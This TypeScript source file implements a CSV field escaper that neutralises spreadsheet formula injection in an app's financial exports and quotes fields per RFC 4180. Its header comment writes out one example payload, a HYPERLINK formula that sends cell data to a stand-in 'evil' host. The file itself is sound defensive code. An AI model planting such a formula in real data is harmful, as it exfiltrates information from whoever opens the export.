// The one CSV field escaper. Every CSV this app writes — server exports (lib/accounting/csv.ts)
// and the client-side "Download CSV" buttons — goes through `csvField`, so the formula-injection
// rule below lives in exactly one place.
//
// FORMULA INJECTION (CWE-1236). Excel, Sheets, Numbers and LibreOffice evaluate a cell whose text
// begins with `=`, `+`, `-` or `@` as a formula — and a tab or carriage return in front of one is
// stripped by some of them first. A company name, deal email subject or journal memo is
// attacker-influenced text (deals arrive by inbound email), so `=HYPERLINK("https://evil/?"&A1,…)`
// in a founder name would run on the GP's machine the moment the export is opened. The OWASP fix:
// prefix such a cell with an apostrophe, which every spreadsheet treats as "this is text".
//
// THE EXCEPTION is text that is a plain number — "-12.50", "-41.67%", "-1e-7". A negative figure
// is the commonest thing in a financial export and is not a formula; prefixing it would turn every
// loss into a text cell. Typed `number`s never reach here as strings in lib/accounting/csv.ts, but
// the client exporters stringify values, and forecast variance percentages are strings by design.

const FORMULA_LEAD = /^[=+\-@\t\r]/
const NUMERIC_LITERAL = /^[+-]?(\d+(\.\d*)?|\.\d+)([eE][+-]?\d+)?%?$/

/** Prefix a leading apostrophe on a string a spreadsheet would read as a formula. */
export function neutraliseCsvFormula(s: string): string {
  if (!FORMULA_LEAD.test(s) || NUMERIC_LITERAL.test(s)) return s
  return `'${s}`
}

/** RFC 4180: quote a field holding a quote, comma, CR or LF, doubling embedded quotes. */
export function quoteCsvField(s: string): string {
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
}

/** A string cell, neutralised then quoted. Pass `{ alwaysQuote: true }` to quote every field. */
export function csvField(s: string, options: { alwaysQuote?: boolean } = {}): string {
  const safe = neutraliseCsvFormula(s)
  return options.alwaysQuote ? `"${safe.replace(/"/g, '""')}"` : quoteCsvField(safe)
}
